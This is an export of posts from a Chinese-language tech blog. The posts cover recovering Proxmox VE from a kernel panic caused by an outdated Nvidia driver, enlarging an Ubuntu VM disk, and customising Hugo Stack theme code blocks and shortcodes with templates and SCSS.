[{"content":"Kernel panic 最近在更新 Proxmox VE 時遇到無法開機的情況\n開機時出現 Kernel panic 無法開機進系統，網頁介面也都失效\nKernel panic - not syncing: VFS: unable to mount root fs on unknown-block(0,0)\n其實早在剛跑完apt upgrade更新指令時，就已經有過徵兆。\nSSH 1 2 3 4 5 6 7 dpkg: error processing package proxmox-kernel-6.8 (--configure): dependency problems - leaving unconfigured Setting up proxmox-headers-6.8 (6.8.12-5) ... Errors were encountered while processing: proxmox-kernel-6.8.12-5-pve-signed proxmox-kernel-6.8 E: Sub-process /usr/bin/dpkg returned an error code (1) 這時就提醒最新版的 kernel 沒安裝成功，不過當時沒注意到\n加上停電重開，遇到時已經是最新版 kernel 故障無法開機的狀態\n解決方法 開機時在 Bootloader 選單時可以選擇用舊版的系統開機\n出現選單時用鍵盤上下選擇進 Advenced Options for Proxmox Virtual Enviornment\n沒有按任何按鍵，倒數幾秒後會自動選擇用最新版的系統開機，然後就又跳 Kernel panic\n選擇舊版系統開機之後能正常開機，但丟著不理下次重開機還是會遇到\n經過排查元凶確定為 Nvidia 顯卡驅動\n之前因為便宜買了一張 nvidia tesla p4 來玩\n驅動版本已經是535，太舊導致安裝新版 proxmox-kernel 失敗\n用指令刪除顯卡驅動\nSSH 1 nvidia-uninstall 刪除之後重新跑 apt upgrade，這次安裝 proxmox-kernel 順利完成，重開機也沒問題了\n這張 p4 也算正式壽終正寢了\n參考資料 圖片來源 https://pve.proxmox.com/wiki/Host_Bootloader\n資料來源 https://www.facebook.com/groups/pve.tw/posts/974292336072661/\n","date":"2025-05-10T19:53:54+08:00","image":"https://raw.githubusercontent.com/proxmox/.github/main/Proxmox-logo-800.svg","permalink":"https://zonego.tw/post/pve-kernel-panic/","title":"Proxmox VE Kernel Panic"},{"content":"調整硬碟大小 在 Proxmox VE WEB UI 中擴大 Ubuntu 虛擬機的硬碟大小\n硬碟空間只能放大，不能縮小\n擴充硬碟分割 (physical drive partition) Ubuntu 虛擬機開機進到 bash 檢視目前磁碟狀態 bash 1 sudo fdisk -l 擴充硬碟分割 bash 1 growpart /dev/sda 3 檢視硬碟分割 bash 1 pvdisplay 擴充硬碟大小 bash 1 sudo pvresize /dev/sda3 檢視硬碟分割 看是否已改 bash 1 pvdisplay 擴充邏輯分割 Logical volume 檢視邏輯分割 bash 1 lvdisplay 擴充邏輯分割 bash 1 sudo lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv 檢視邏輯分割 看是否有擴充 bash 1 lvdisplay 調整 Filesystem 調整檔案系統大小 bash 1 resize2fs /dev/ubuntu-vg/ubuntu-lv 檢查是否調整成功 bash 1 2 fdisk -l df -h 參考來源 [SOLVED] - Resize Ubuntu VM disk | Proxmox Support Forum ","date":"2025-03-26T12:58:19+08:00","image":"https://raw.githubusercontent.com/proxmox/.github/main/Proxmox-logo-800.svg","permalink":"https://zonego.tw/post/pve-ubuntu-disk/","title":"Proxmox VE 擴大 Ubuntu 虛擬機硬碟大小"},{"content":"Stack 主題自帶的 CodeBlock，就蠻好看的，複製的功能也有，不過就少了顯示檔名(標題)的功能\n搜尋過後發現 Hugo 可以單獨改 CodeBlock 的轉譯，後面就紀錄修改的方式\n修改步驟 新增渲染檔案 📂 Folder my-project/\n└── layouts/\n└── _default/\n└── _markup/\n└── render-codeblock.html\n新增 render-codeblock.html 檔案，貼入下面內容\n不更改原有的 CodeBlock，新增顯示語言類型type跟檔名title\n\u0026lt;/\u0026gt; html 📄 render-codeblock.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 {{- $label := print .Type \u0026#34; code snippet\u0026#34; -}} \u0026lt;figure class=\u0026#34;code-block\u0026#34; role=\u0026#34;figure\u0026#34; aria-label=\u0026#34;{{- $label | plainify -}}\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;code-header\u0026#34;\u0026gt; {{- with .Type }} \u0026lt;span class=\u0026#34;code-type\u0026#34;\u0026gt;{{ . | markdownify }}\u0026lt;/span\u0026gt; {{- end -}} {{- with .Attributes.title }} \u0026lt;span class=\u0026#34;code-title\u0026#34;\u0026gt;{{ . | markdownify }}\u0026lt;/span\u0026gt; {{- end -}} \u0026lt;/div\u0026gt; {{- with transform.HighlightCodeBlock . -}} {{ .Wrapped }} {{- end -}} \u0026lt;/figure\u0026gt; 新增 SCSS 建立assets/partials/highlight資料夾，新增dark.scss, light.scss, title.scss 3個scss檔\n📂 Folder my-project/\n└── assets/\n└── partials/\n└── highlight/\n├── dark.scss\n├── light.scss\n└── title.scss\ndark.scss 跟 light.scss 主要是為了覆蓋原本主題的scss\n加入引用自訂的title.scss，其餘就照貼原本 Stack 主題的設定\n如果對CodeBlock的顏色不滿意也可以在這邊改\n\u0026lt;/\u0026gt; scss 📄 dark.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /* * Style: monokai * https://xyproto.github.io/splash/docs/monokai.html */ $color: #f8f8f2; $background-color: #272822; $error-color: #bb0064; $keyword-color: #66d9ef; $text-color: $color; $name-color: #a6e22e; $literal-color: #e6db74; // title colors $type-color: #4B4376; $title-color: #432E54; @import \u0026#34;title.scss\u0026#34;; @import \u0026#34;common.scss\u0026#34;; \u0026lt;/\u0026gt; scss 📄 light.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /* * Style: monokailight * https://xyproto.github.io/splash/docs/monokailight.html */ $color: #272822; $background-color: #fafafa; $error-color: #960050; $keyword-color: #00a8c8; $text-color: #111111; $name-color: #75af00; $literal-color: #d88200; // title colors $type-color: #D0E8C5; $title-color: #C5D3E8; @import \u0026#34;title.scss\u0026#34;; @import \u0026#34;common.scss\u0026#34;; \u0026lt;/\u0026gt; scss 📄 title.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 .code-block { .code-header { display: table; padding-top: 5px; padding-right: 5px; } .code-type { position: relative; background-color: $type-color; padding: 5px; padding-left: 10px; padding-right: 10px; border-radius: 0px 15px 15px 0px; float: left; z-index: 2; } .code-title { position: relative; background-color: $title-color; padding: 5px; padding-right: 10px; padding-left: 25px; margin-left: -15px; border-radius: 0px 15px 15px 0px; float: left; z-index: 1; } } 這樣就完成了\n效果展示 不指定語言類型、檔名 Codeblock 標頭 ```\n1 2 3 var a = 0; console.log(a); 指定語言類型 Codeblock 標頭 ``` javascript\n\u0026lt;/\u0026gt; javascript 1 2 3 var a = 0; console.log(a); 指定檔名 Codeblock 標頭 ``` {title=\u0026ldquo;test.js\u0026rdquo;}\n📄 test.js 1 2 3 var a = 0; console.log(a); 全都指定 Codeblock 標頭 ``` javascript {title=\u0026ldquo;test.js\u0026rdquo;}\n\u0026lt;/\u0026gt; javascript 📄 test.js 1 2 3 var a = 0; console.log(a); terminal 區塊 效果展示 bash 1 2 3 \\$ ls here is some bash output example \u0026lt;/\u0026gt; markdown 1 2 3 4 5 ``` terminal {title=\u0026#34;bash\u0026#34;} \\$ ls here is some bash output example ... 新增 HTML 模版 同場加映，我在這邊有利用shortcode 另外做 termainal 風格的區塊\n有需要可以至隔壁篇看 Hugo 短代碼\n同樣的效果也可以用 hugo 的特性，用 codeblock 加指定語言做到\nHugo 支援指定不同語言，就自動去找對應的渲染模版\n下面範例 新增 mermaid 跟 python 模版\n📂 Folder layouts/\n└── _default/\n└── _markup/\n├── render-codeblock-mermaid.html\n├── render-codeblock-python.html\n└── render-codeblock.html\n所以我們只要新增 render-codeblock-terminal.html\n就可以區分一般程式碼跟終端機的內容\n\u0026lt;/\u0026gt; html 📄 render-codeblock-terminal.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 {{- $label := print .Type \u0026#34; code snippet\u0026#34; -}} \u0026lt;div class=\u0026#34;terminal\u0026#34; role=\u0026#34;figure\u0026#34; aria-label=\u0026#34;{{- $label | plainify -}}\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;terminal-header\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;terminal-btn\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;btn-mac mac-close\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;btn-mac mac-mini\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;btn-mac mac-full\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if .Attributes.title }} \u0026lt;div class=\u0026#34;terminal-title\u0026#34;\u0026gt;{{.Attributes.title}}\u0026lt;/div\u0026gt; {{ else }} \u0026lt;div class=\u0026#34;terminal-title\u0026#34;\u0026gt;terminal\u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{- with transform.HighlightCodeBlock . -}} {{ .Wrapped }} {{- end -}} \u0026lt;/div\u0026gt; 新增 SCSS 如果已經有加入 terminal shortcode 這邊就不用改了\n下面 SCSS 的內容一模一樣\n新增 terminal.scss 放在 my-project/assets/scss/partials/highlight/\n程式碼主要參考 codepen 上 Sam Willis 跟 Microk 分享的範例\nSam Willis Pure CSS OSX window Microk Code Window for MAC OS Style \u0026lt;/\u0026gt; scss 📄 terminal.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 /* Fira Code: https://github.com/tonsky/FiraCode */ @import url(\u0026#39;https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700\u0026amp;display=swap\u0026#39;); $font-size: 1.5rem; $line-height: 1.54em; .terminal { border: 1px solid #e6e6e6; border-radius: 0.7em; box-shadow: 0 0 24px rgba(0, 0, 0, 0.1); overflow: hidden; .terminal-header{ background-color: $terminal-header; color: $terminal-header-font; display: grid; grid-template-columns: 25% auto 25%; .terminal-title { -webkit-box-align: center; -moz-box-align: center; align-items: center; display: -moz-box; -webkit-box-pack: center; -moz-box-pack: center; justify-content: center; text-align: center; } .terminal-btn, .terminal-cp { padding: 0 6px; } .terminal-btn { display: flex; .btn-mac { width: 15px; height: 15px; margin: 8px 4px; border-radius: 50%; } .mac-close { background-color: #ff5f56; } .mac-mini { background-color: #ffbd2e; } .mac-full { background-color: #27c93f; } } .terminal-cp { align-items: center; } } .terminal-block { box-sizing: border-box; margin: 0; padding: 0; font-family: \u0026#34;Fira Code\u0026#34;, Monaco, Consolas, \u0026#34;Ubuntu Mono\u0026#34;, monospace; font-size: $font-size; font-weight: 400; font-style: normal; line-height: $line-height; letter-spacing: -0.01em; background-color: $terminal-background; color: $terminal-foreground; text-rendering: optimizeLegibility; /* -webkit-font-smoothing: antialiased; */ font-feature-settings: \u0026#34;liga\u0026#34;, \u0026#34;tnum\u0026#34;, \u0026#34;ss01\u0026#34;, \u0026#34;locl\u0026#34;; font-variant-ligatures: contextual; -webkit-overflow-scrolling: touch; -webkit-text-size-adjust: 100%; p { padding: 10px; margin: 0; } } } 然後就是修改 my-project/assets/scss/partials/highlight/ 裡的 dark.scss 跟 light.scss 內分別加入顏色變數還有引用\n\u0026lt;/\u0026gt; scss 📄 dark.scss 1 2 3 4 5 6 7 // terminal $terminal-header: #273138; $terminal-header-font: #ffffff; $terminal-background: #000000; $terminal-foreground: #4EEE85; @import \u0026#34;custom/terminal.scss\u0026#34;; \u0026lt;/\u0026gt; scss 📄 light.scss 1 2 3 4 5 6 7 // terminal $terminal-header: #f4f4f7; $terminal-header-font: #000000; $terminal-background: #ffffff; $terminal-foreground: #000000; @import \u0026#34;custom/terminal.scss\u0026#34;; info success warning error 4色提示 效果展示 in info\n第二行\nin success\n第二行\nin warning\n第二行\nin error\n第二行\n\u0026lt;/\u0026gt; markdown 1 2 3 ``` info 可以將 info 替換為 success, warning, error 第二行 新增 HTML 模版 同樣在 _markup 資料夾內新增4個模版\n📂 Folder my-project/\n└── layouts/\n└── _default/\n└── _markup/\n├── render-codeblock-info.html\n├── render-codeblock-success.html\n├── render-codeblock-warning.html\n└── render-codeblock-error.html\n這邊模版其實大同小異，只差在 class 跟 svg 圖檔不同\n之所以要這樣建四個，而不是用參數調整，是為了在寫 markdown 時可以少打幾個字\n\u0026lt;/\u0026gt; html 📄 render-codeblock-info.html 1 2 3 4 5 6 7 8 9 \u0026lt;!-- remove first word is newline --\u0026gt; {{- $lines := (replaceRE `^\\n` \u0026#34;\u0026#34; .Inner) -}} \u0026lt;div class=\u0026#34;simple-notice simple-notice-info\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;simple-notice-title\u0026#34;\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; class=\u0026#34;simple-notice-icon\u0026#34; viewBox=\u0026#34;0 0 512 512\u0026#34; fill=\u0026#34;currentColor\u0026#34;\u0026gt;\u0026lt;path d=\u0026#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z\u0026#34;/\u0026gt;\u0026lt;/svg\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p\u0026gt;{{ $lines | markdownify }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/\u0026gt; html 📄 render-codeblock-success.html 1 2 3 4 5 6 7 8 9 \u0026lt;!-- remove first word is newline --\u0026gt; {{- $lines := (replaceRE `^\\n` \u0026#34;\u0026#34; .Inner) -}} \u0026lt;div class=\u0026#34;simple-notice simple-notice-success\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;simple-notice-title\u0026#34;\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; class=\u0026#34;simple-notice-icon\u0026#34; viewBox=\u0026#34;0 0 512 512\u0026#34; fill=\u0026#34;currentColor\u0026#34;\u0026gt;\u0026lt;path d=\u0026#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z\u0026#34;/\u0026gt;\u0026lt;/svg\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p\u0026gt;{{ $lines | markdownify }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/\u0026gt; html 📄 render-codeblock-warning.html 1 2 3 4 5 6 7 8 9 \u0026lt;!-- remove first word is newline --\u0026gt; {{- $lines := (replaceRE `^\\n` \u0026#34;\u0026#34; .Inner) -}} \u0026lt;div class=\u0026#34;simple-notice simple-notice-warning\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;simple-notice-title\u0026#34;\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; class=\u0026#34;simple-notice-icon\u0026#34; viewBox=\u0026#34;0 0 512 512\u0026#34; fill=\u0026#34;currentColor\u0026#34;\u0026gt;\u0026lt;path d=\u0026#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z\u0026#34;/\u0026gt;\u0026lt;/svg\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p\u0026gt;{{ $lines | markdownify }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/\u0026gt; html 📄 render-codeblock-error.html 1 2 3 4 5 6 7 8 9 \u0026lt;!-- remove first word is newline --\u0026gt; {{- $lines := (replaceRE `^\\n` \u0026#34;\u0026#34; .Inner) -}} \u0026lt;div class=\u0026#34;simple-notice simple-notice-error\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;simple-notice-title\u0026#34;\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; class=\u0026#34;simple-notice-icon\u0026#34; viewBox=\u0026#34;0 0 576 512\u0026#34; fill=\u0026#34;currentColor\u0026#34;\u0026gt;\u0026lt;path d=\u0026#34;M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zM124 296c-6.6.0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h264c6.6.0 12 5.4 12 12v56c0 6.6-5.4 12-12 12H124z\u0026#34;/\u0026gt;\u0026lt;/svg\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p\u0026gt;{{ $lines | markdownify }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; 新增 SCSS 檔 加完模版之後就是在 my-project/assets/scss/partials/highlight/ 新增 SCSS\n\u0026lt;/\u0026gt; scss 📄 notice.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 .simple-notice { position:relative; padding: 1em 0 1em 2em; margin-bottom: 1em; transition: all .5s; p:last-child { margin-bottom: 0; } .simple-notice-title { position: absolute; left: 16px; margin-top: 16px; font-size: 1.2em; .simple-notice-icon { width: 1em; height: 1em; margin-left: -0.8em; } } \u0026amp;.simple-notice-error { border-top: 2px solid $notice-error-color; color: $notice-error-color; a { color: $notice-error-color; text-decoration-color: $notice-error-color; } } \u0026amp;.simple-notice-warning { border-top: 2px solid $notice-warning-color; color: $notice-warning-color; a { color: $notice-warning-color; text-decoration-color: $notice-warning-color; } } \u0026amp;.simple-notice-info { border-top: 2px solid $notice-info-color; color: $notice-info-color; a { color: $notice-info-color; text-decoration-color: $notice-info-color; } } \u0026amp;.simple-notice-success { border-top: 2px solid $notice-success-color; color: $notice-success-color; a { color: $notice-success-color; text-decoration-color: $notice-success-color; } } } 然後在 dark.scss 跟 light.scss 檔內，加上對應的顏色變數跟引用 notice.scss\n\u0026lt;/\u0026gt; scss 📄 dark.scss 1 2 3 4 5 6 7 // notice $notice-error-color: hsl(0, 65%, 65%); $notice-warning-color: hsl(30, 80%, 70%); $notice-info-color: hsl(200, 65%, 65%); $notice-success-color: hsl(140, 65%, 65%); @import \u0026#34;notice.scss\u0026#34;; \u0026lt;/\u0026gt; scss 📄 light.scss 1 2 3 4 5 6 7 // notice $notice-error-color: hsl(0, 100%, 35%); $notice-warning-color: hsl(40, 80%, 45%); $notice-info-color: hsl(210, 100%, 25%); $notice-success-color: hsl(150, 100%, 25%); @import \u0026#34;notice.scss\u0026#34;; 參考 資料\n官方文件Code block render hooks Custom code blocks in Hugo Labeling Code Blocks in Hugo Photo by Rahul Mishra on Unsplash\n","date":"2025-03-19T15:32:15+08:00","image":"https://zonego.tw/post/hugo-codeblock/cover_hu_ed4ecba908077122.jpg","permalink":"https://zonego.tw/post/hugo-codeblock/","title":"Hugo Theme Stack 修改 CodeBlock"},{"content":"shortcode 是什麼 有時候我們有些文章排版的想法，在原始的 markdown 中沒有\n或者跟內文很難區分，要每次都自己手磋 html 出來又嫌麻煩\nHugo 內建的短代碼 shortcode 是一種將模板整合為小型、可重複使用的片段的方法\n雖然 shortcode 在其他地方無法使用，想匯出貼文轉到其他平台會需要另外調整\n不過想加入 Markdown 本身不支援的排版，有這點轉換成本還可以接受\n語法格式 加 shortcode 進我們的 Hugo 專案其實也不難，大概就3個步驟\n新增模版 html 新增排版的 css 在貼文或頁面 markdown 加入使用的語法 shortcode 使用語法 這邊先講在 markdown 裡面使用的語法\n\u0026lt;/\u0026gt; markdown 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;!-- 使用語法 --\u0026gt; {{\u0026lt; myshortcode \u0026gt;}} \u0026lt;!-- 或是 --\u0026gt; {{% myshortcode %}} \u0026lt;!-- 需要包住內容時 --\u0026gt; {{\u0026lt; myshortcode \u0026gt;}} * a * b {{\u0026lt; /myshortcode \u0026gt;}} \u0026lt;!-- 這是加上註解，跳過轉譯 --\u0026gt; {{\u0026lt;/* myshortcode \u0026gt;}} * a * b {{\u0026lt; /myshortcode */\u0026gt;}} 像上面的引用範例，Hugo 會去找 layouts/shortcodes/myshortcode.html 這個檔案來替換內容。\n如果想要用資料夾整理也可以。例如 {{\u0026lt;myfolder/myshortcode\u0026gt;}} 就會去找 layouts/shortcodes/myfolder/myshortcode.html。\nhtml模版 這邊我們的模版 html 檔，可以像平常寫 html 一樣、也可以可以傳入參數、抓專案裡面的檔案資源。\n傳入參數 我們可以定義在 myshortcode ，用類似 HTML 屬性的方式傳入參數。\n如果沒有定屬性名稱，也可以用位置抓值。\n\u0026lt;/\u0026gt; markdown 1 {{\u0026lt; myshortcode \u0026#34;value1\u0026#34; class=\u0026#34;my-component\u0026#34; myattr=\u0026#34;value2\u0026#34; \u0026gt;}} 在 html 檔案內就可以用 Get method 抓到對應的值\n\u0026lt;/\u0026gt; html 📄 myshortcode.html 1 2 3 4 \u0026lt;div class={{ .Get \u0026#34;class\u0026#34; }}\u0026gt; \u0026lt;p\u0026gt;{{ .Get 0 }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{{ .Get \u0026#34;myattr\u0026#34; }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; Hugo 轉譯完之後會變為\n\u0026lt;/\u0026gt; html 1 2 3 4 \u0026lt;div class=\u0026#34;my-component\u0026#34;\u0026gt; \u0026lt;p\u0026gt;value1\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;value2\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; 傳入包住的內容 Inner 傳入的內容可以使用 $Inner 抓取，看使用情形可以作額外處理。\n例如作為一般文字可以包在 \u0026lt;p\u0026gt; 內再輸出到HTML\n{{ printf ``\u0026lt;p\u0026gt;%s\u0026lt;/p\u0026gt;`` $Inner | safeHTML }}\n作為 markdown 做轉譯\n{{ .Inner | markdownify }}\n抓靜態資源 需要抓靜態檔案的資源，可以使用 resources.GetMatch\n例如下面的範例就找 my-project/assets/icons/world.svg\n再用 | safeHTML 把SVG檔的內容貼進 HTML\n\u0026lt;/\u0026gt; html 1 2 3 4 \u0026lt;div class=\u0026#34;logo\u0026#34;\u0026gt; {{- $iconFile := resources.GetMatch \u0026#34;icons/world.svg\u0026#34; -}} {{ $iconFile.Content | safeHTML }} \u0026lt;/div\u0026gt; 抓 data 檔案內的資料 Hugo 可以使用$.Site.Data 去抓 my-project/data/*.toml 內的內容\n例如我將內容放在 my-project/data/SVG.html 內\n\u0026lt;/\u0026gt; toml 📄 SVG.toml 1 repository-icon = \u0026#39;\u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; class=\u0026#34;icon\u0026#34; viewBox=\u0026#34;0 0 16 16\u0026#34;\u0026gt;\u0026lt;path fill-rule=\u0026#34;evenodd\u0026#34; clip-rule=\u0026#34;evenodd\u0026#34; d=\u0026#34;M2 2.5C2 1.83696 2.26339 1.20107 2.73223 0.732233C3.20108 0.263392 3.83696 0 4.5 0L13.25 0C13.4489 0 13.6397 0.0790176 13.7803 0.21967C13.921 0.360322 14 0.551088 14 0.75V13.25C14 13.4489 13.921 13.6397 13.7803 13.7803C13.6397 13.921 13.4489 14 13.25 14H10.75C10.5511 14 10.3603 13.921 10.2197 13.7803C10.079 13.6397 10 13.4489 10 13.25C10 13.0511 10.079 12.8603 10.2197 12.7197C10.3603 12.579 10.5511 12.5 10.75 12.5H12.5V10.5H4.5C4.30308 10.5 4.11056 10.5582 3.94657 10.6672C3.78257 10.7762 3.65442 10.9312 3.57816 11.1128C3.50191 11.2943 3.48096 11.4943 3.51793 11.6878C3.5549 11.8812 3.64816 12.0594 3.786 12.2C3.92524 12.3422 4.0023 12.5338 4.00024 12.7328C3.99818 12.9318 3.91716 13.1218 3.775 13.261C3.63285 13.4002 3.4412 13.4773 3.24222 13.4752C3.04325 13.4732 2.85324 13.3922 2.714 13.25C2.25571 12.7829 1.99929 12.1544 2 11.5V2.5ZM12.5 1.5V9H4.5C4.144 9 3.806 9.074 3.5 9.208V2.5C3.5 2.23478 3.60536 1.98043 3.79289 1.79289C3.98043 1.60536 4.23478 1.5 4.5 1.5H12.5ZM5 12.25V15.5C5 15.5464 5.01293 15.5919 5.03734 15.6314C5.06175 15.6709 5.09667 15.7028 5.1382 15.7236C5.17972 15.7444 5.22621 15.7532 5.27245 15.749C5.31869 15.7448 5.36286 15.7279 5.4 15.7L6.85 14.613C6.89328 14.5805 6.94591 14.563 7 14.563C7.05409 14.563 7.10673 14.5805 7.15 14.613L8.6 15.7C8.63714 15.7279 8.68131 15.7448 8.72755 15.749C8.77379 15.7532 8.82028 15.7444 8.8618 15.7236C8.90333 15.7028 8.93826 15.6709 8.96266 15.6314C8.98707 15.5919 9 15.5464 9 15.5V12.25C9 12.1837 8.97366 12.1201 8.92678 12.0732C8.87989 12.0263 8.81631 12 8.75 12H5.25C5.1837 12 5.12011 12.0263 5.07322 12.0732C5.02634 12.1201 5 12.1837 5 12.25Z\u0026#34;/\u0026gt;\u0026lt;/svg\u0026gt;\u0026#39; 在 html 模版中可以使用 {{ index $.Site.Data.SVG \u0026quot;repository-icon\u0026quot; }} 來抓取內容。\n變數、函數 看過上面的用法，Hugo對於包在 {{ }} 中間的用法，就像一般程式在傳參數或調用函式。所以不只有單純顯示，裡面也可以作簡單的邏輯判斷或其他操作。\n例如我想判斷一段 shortcode 的 Inner 內容是不是 \u0026lt;p\u0026gt; 開頭，如果不是就強制包進去，我就可以用下面的程式碼做到。先將 markdown 轉譯完的內容放進 content 變數，再做條件判斷。\n\u0026lt;/\u0026gt; html 1 2 3 4 5 6 7 8 9 \u0026lt;myshortcode\u0026gt; {{ $content := .Inner | markdownify }} {{ if not (strings.HasPrefix $content \u0026#34;\u0026lt;p\u0026gt;\u0026#34;) }} {{ printf `\u0026lt;p\u0026gt;%s\u0026lt;/p\u0026gt;` $content | safeHTML }} {{ else }} {{ $content }} {{ end }} \u0026lt;/myshortcode\u0026gt; 另外比較常用的 method 就是替換。例如要將 class 從 a 換成 b。\n{{ $result := replace $content \u0026quot;a\u0026quot; \u0026quot;b\u0026quot; }}\n更多可用的 Method 請參考官網的 Methods\nCSS美化 固定主題 我們自訂的css設定可以放在 my-project/assets/scss/custom.scss。\n雖然 shortcode 的 css 不會經常改，如果 shortcode 的數量一多，custom.scss 裡面變成一整團，要改也很麻煩。\n所以我會把 shortcode 的 css 單讀拆分一個檔案出來，例如在 scss 資料夾內新增 myshortcode.scss，讓 custom.scss 去引用。\n\u0026lt;/\u0026gt; scss 📄 custom.scss 1 @import \u0026#34;myshortcode.scss\u0026#34;; 如果想用資料夾整理也可以，例如在 scss 資料夾內新增 myshortcode 資料夾 my-project/assets/scss/myshortcode/main.scss 。\n\u0026lt;/\u0026gt; scss 📄 custom.scss 1 @import \u0026#34;myshortcode/main.scss\u0026#34;; 白天、夜晚模式 如果需要讓 shortcode 跟隨白天夜晚模式變化，我們需要用拆分檔案引用方式，不過就不是在 custom.scss 內引用了。\n新增 highlight 資料夾 my-project/assets/scss/partials/highlight/\n並新增 dark.scss 跟 light.scss 取代原本主題自帶的 scss\n各自貼上下面的內容，這些程式碼都是照搬主題原始的 scss\n最後就是定好顏色變數，不要跟已有的重複就行了 (下面範例夜晚會出現綠色，白天紅色)\n\u0026lt;/\u0026gt; scss 📄 dark.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 /* * Style: monokai * https://xyproto.github.io/splash/docs/monokai.html */ $color: #f8f8f2; $background-color: #272822; $error-color: #bb0064; $keyword-color: #66d9ef; $text-color: $color; $name-color: #a6e22e; $literal-color: #e6db74; // title colors $type-color: #4B4376; $title-color: #432E54; @import \u0026#34;common.scss\u0026#34;; // 在這邊引用 $myshortcode-color:rgb(0, 255, 0); @import \u0026#34;myshortcode.scss\u0026#34;; \u0026lt;/\u0026gt; scss 📄 light.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 /* * Style: monokailight * https://xyproto.github.io/splash/docs/monokailight.html */ $color: #272822; $background-color: #fafafa; $error-color: #960050; $keyword-color: #00a8c8; $text-color: #111111; $name-color: #75af00; $literal-color: #d88200; // title colors $type-color: #D0E8C5; $title-color: #C5D3E8; @import \u0026#34;common.scss\u0026#34;; // 在這邊引用 $myshortcode-color:rgb(255, 0, 0); @import \u0026#34;myshortcode.scss\u0026#34;; 這個方式也不限於只有 shortcode 的 scss 能用，像 page 或是其他地方需要修改也可以用這種方式引用。\n後面就放意本站有做的 shortcode\n嵌入 notion 風格書籤 hugo The world’s fastest framework for building websites. 下載 ICON 到 tabler icon 下載 world svg 檔案，放到 icons 資料夾\nmy-project/assets/icons/world.svg\ntabler icon Free and open source icons designed to make your website or app attractive, visually consistent and simply beautiful. 新增 bookmark.html 到 layouts 資料夾內新增 shortcodes 資料夾，新增 bookmark.html\nmy-project/layouts/shortcodes/bookmark.html\n\u0026lt;/\u0026gt; html 📄 bookmark.html 1 2 3 4 5 6 7 8 9 10 \u0026lt;a href={{ .Get \u0026#34;link\u0026#34; }} target=\u0026#34;_blank\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;bookmark\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;logo\u0026#34;\u0026gt; {{- $iconFile := resources.GetMatch \u0026#34;icons/world.svg\u0026#34; -}} {{ replace $iconFile.Content \u0026#34;icon\u0026#34; \u0026#34;icon 